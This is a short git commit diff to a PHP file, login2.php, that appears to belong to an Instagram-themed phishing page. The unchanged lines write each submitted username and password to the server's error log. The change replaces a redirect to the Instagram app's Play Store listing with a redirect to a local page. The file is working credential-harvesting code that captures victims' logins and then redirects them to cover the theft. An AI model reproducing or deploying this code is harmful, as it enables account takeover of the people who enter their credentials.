b69e9632434a984a7a2cedfb4e1cfb0b9a3c95c1
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 18:05:40 +0530

    Add files via upload

--- login2.php
+++ login2.php
@@ -3,5 +3,5 @@ error_log("---------------------------------------------------------------------
 error_log("id&pass found");
 error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
 error_log("-----------------------------------------------------------------------");
-header('Location: https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=2E6A1490-9BF7-4775-BA25-484C2546A5E8&utm_content=lo&utm_medium=badge');
+header('Location:/index3.html');
 exit();
